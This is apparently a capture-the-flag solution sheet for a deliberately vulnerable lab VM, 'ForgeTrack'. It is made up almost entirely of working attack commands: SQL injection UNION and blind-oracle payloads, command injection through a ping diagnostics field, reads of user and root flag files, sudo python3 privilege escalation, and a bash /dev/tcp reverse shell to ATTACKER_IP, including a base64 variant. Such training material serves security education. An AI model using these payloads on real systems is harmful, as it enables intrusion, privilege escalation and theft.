# ForgeTrack — flag command sheet

Authorised lab use only. Replace `VM_IP` with the target address.

```bash
BASE=http://VM_IP
ATK=ATTACKER_IP          # your VMware adapter address, reachable from the VM
```

## 0. Confirm the target

```bash
curl -sSI "$BASE/"
curl -sS "$BASE/" | grep -o 'Built for the next lap'
curl -sS -o /dev/null -w 'GET / -> %{http_code}\n' "$BASE/"
curl -sS -o /dev/null -w 'GET /diagnostics -> %{http_code}\n' "$BASE/diagnostics"
```

---

## 1. Web flag — search injection

Six columns: `id, build_code, name, status, car_code, notes`.

```bash
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  "$BASE/builds/search" | grep -oE 'RFM\{[^}]*\}'
```

Expected: `RFM{search_breach_confirmed}`

The leading `%' )` closes the `ILIKE '%...%'` string **and** the parenthesis.

## 2. Web flag — UNION record extraction

```bash
curl -sS --get \
  --data-urlencode "id=0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- " \
  "$BASE/builds/view" | grep -oE 'RFM\{[^}]*\}'
```

Expected: `RFM{the_forge_has_a_hidden_lane}`

## 3. Web flag — blind boolean oracle

```bash
# true -> 200, false -> 404
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR 1=1 -- " "$BASE/telemetry/check"
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR 1=2 -- " "$BASE/telemetry/check"

# one character test
curl -sS -o /dev/null -w '%{http_code}\n' --get \
  --data-urlencode "session=x' OR (SELECT substring(flag_value,1,5) FROM flags WHERE challenge='blind') = 'RFM{t' -- " \
  "$BASE/telemetry/check"
```

Automated extraction (stdlib only):

```bash
python3 get-blind-flag.py "$BASE"
```

Expected: `RFM{telemetry_never_stays_silent}`

## 4. Web flag — remediation comparison

```bash
# The vulnerable route still leaks it:
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='remediation' -- " \
  "$BASE/builds/search" | grep -oE 'RFM\{[^}]*\}'

# The fixed route must reject the same input (expect 0):
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  "$BASE/secure/builds/search" | grep -c 'RFM{'
```

Expected: `RFM{secure_build_verified}` and `0`.

---

## 5. Foothold — command injection

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; id' \
  "$BASE/diagnostics/ping" | grep -oE 'uid=[0-9]+\([^)]*\)'
```

Expected on the VM: `uid=33(www-data)`.

## 6. OS flags — direct, no interactive shell

Both flags in one request:

```bash
PAYLOAD=$(cat <<'EOF'
127.0.0.1; echo __USER_FLAG__; cat /home/forge/user.txt; echo __ROOT_FLAG__; sudo -n /usr/bin/python3 -c "import os; os.system('cat /root/root.txt')"; echo __END__
EOF
)

curl -sS --get --data-urlencode "host=$PAYLOAD" "$BASE/diagnostics/ping"
```

Or one at a time:

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; cat /home/forge/user.txt' \
  "$BASE/diagnostics/ping" | grep -oE 'THM\{[^}]*\}'

curl -sS --get \
  --data-urlencode "host=127.0.0.1; sudo -n /usr/bin/python3 -c \"import os; os.system('cat /root/root.txt')\"" \
  "$BASE/diagnostics/ping" | grep -oE 'THM\{[^}]*\}'
```

Flag values are whatever was configured in `/home/forge/user.txt` and
`/root/root.txt` when the VM was built.

## 7. OS flags — interactive reverse shell

Attacker terminal 1:

```bash
nc -lvnp 4444
```

Attacker terminal 2:

```bash
curl -sS --get \
  --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/$ATK/4444 0>&1' >/dev/null 2>&1 &" \
  "$BASE/diagnostics/ping"
```

Base64 fallback:

```bash
PAYLOAD=$(printf '%s' "bash -i >& /dev/tcp/$ATK/4444 0>&1" | base64 -w0)
curl -sS --get \
  --data-urlencode "host=127.0.0.1; echo $PAYLOAD | base64 -d | bash &" \
  "$BASE/diagnostics/ping"
```

Fully automated (listener + exploit + flag extraction):

```bash
python3 get-reverse-shell.py "$BASE" --attacker "$ATK" --port 4444
```

## 8. Commands inside the shell

```bash
id                                      # uid=33(www-data)
cat /home/forge/user.txt                # user flag
sudo -n -l                              # (root) NOPASSWD: /usr/bin/python3

sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id                                      # uid=0(root)
cat /root/root.txt                      # root flag
```

---

## 9. One command to collect everything

```bash
bash get-all-flags.sh "$BASE"
```

Individual scripts:

| Script | Result |
|---|---|
| `get-web-flags.sh http://VM_IP` | all four `RFM{...}` flags |
| `get-blind-flag.py http://VM_IP` | blind flag only |
| `get-os-flags.sh http://VM_IP` | `user.txt` + `root.txt` in one request |
| `get-reverse-shell.py http://VM_IP --attacker IP` | interactive shell, privesc, both flags |

## 10. Troubleshooting

| Symptom | Check |
|---|---|
| No flag in search response | Payload must start `%' )` — close both string and parenthesis |
| `0 matching record(s)` for UNION | Same cause; the `UNION` is inside the `(...)` group |
| Blind script stalls | Use `substring()` equality, not `LIKE` (`_` is a wildcard) |
| Injection shows your own UID | Local dev server; only the packaged VM runs as `www-data` |
| `sudo -n -l` asks for a password | Weak sudo rule missing; re-run `sudo bash install.sh` |
| `root.txt: NOT FOUND` | `sudo python3` failed, or the flag file is absent |
| Reverse shell does not connect | Check `--attacker` IP, VMware adapter mode, and host firewall |
| `Connection refused` on port 80 | `systemctl is-active nginx postgresql forgetrack` inside the VM |
